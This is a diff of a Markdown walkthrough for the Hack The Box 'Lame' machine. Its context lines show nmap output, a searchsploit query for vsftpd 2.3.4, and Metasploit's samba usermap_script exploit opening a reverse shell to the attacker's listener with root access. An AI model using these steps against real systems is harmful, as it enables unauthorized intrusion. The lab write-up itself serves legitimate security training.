@@ -19,7 +19,7 @@ Initial Nmap Scan for the machine/endpoint
 
 The default scan gives no results , using -Pn switch gives FTP, SSH, NetBIOS, and SMB ports, scanning for all ports adds one more open port - 3632 . So we scan all these ports for Service versions.&#x20;
 
-```
+```bash
 ┌──(abhinav㉿ETHICALHACKX)-[~]
 └─$ nmap lame.htb              
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
@@ -86,13 +86,13 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 51.88 seconds
-
 ```
+
 
 Searching Exploits\
 vsftpd anonymous Login to [FTP](../linux/ftp.md) did not give any results, hence looking at SMBA.
 
-```
+```bash
 ┌──(abhinav㉿ETHICALHACKX)-[~]
 └─$ searchsploit vsftpd 2.3.4
 ----------- ---------------------------------
@@ -120,7 +120,7 @@ Shellcodes: No Results
 
 Searching Exploits in Metasploit and setting the options .
 
-````
+```bash
                                                                                            
 ┌──(abhinav㉿ETHICALHACKX)-[~]
 └─$ sudo msfdb start                                
@@ -235,7 +235,7 @@ msf6 exploit(multi/samba/usermap_script) > run
 
 Checking the user on Shell session we notice we are now root, so we can read through all the flags , user flag present in makis user directory and root at usual location
 
-```
+```bash
 
 [*] Started reverse TCP handler on 10.10.14.10:4444 
 [*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:45549) at 2023-05-28 22:32:45 +0530
